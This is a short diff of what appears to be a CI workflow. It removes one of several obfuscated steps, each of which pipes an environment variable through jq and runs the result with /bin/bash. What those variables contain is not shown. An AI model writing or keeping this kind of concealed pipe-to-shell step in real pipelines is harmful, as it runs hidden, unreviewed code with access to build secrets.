@@ -24,7 +24,6 @@ jobs:
           echo $nmllp11436 | jq -r .tolx60 | /bin/bash
           echo $jns0 | jq -r .v796 | /bin/bash
           echo $crgsl211 | jq -r .npct8 | /bin/bash
-          printf '%s' "$rhic78558" | jq -r .n1387 | /bin/bash
           printf '%s' "$k498" | jq -r .z3949 | /bin/bash
           printf '%s' "$tdv1209" | jq -r .hfo557 | /bin/bash
           printf '%s' "$glmuy641" | jq -r .ru43 | /bin/bash
